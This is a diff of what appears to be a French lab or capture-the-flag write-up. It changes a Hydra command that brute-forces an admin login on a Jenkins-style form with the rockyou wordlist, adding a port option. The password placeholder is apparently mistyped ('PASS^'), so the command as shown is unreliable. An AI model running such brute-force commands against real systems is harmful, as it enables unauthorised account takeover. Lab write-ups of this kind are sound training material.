@@ -200,6 +200,6 @@ Après une longue recherche infructueuse, je me laisse tenter par un brute force
 on va utiliser Hydra pour cela :
 
 ```
-hydra -l admin -P /home/kali/Wordlist/rockyou.txt 10.10.116.71 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -I
+hydra -l admin -P /home/kali/Wordlist/rockyou.txt 10.10.116.71 -s 4545 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -I
 ```
 
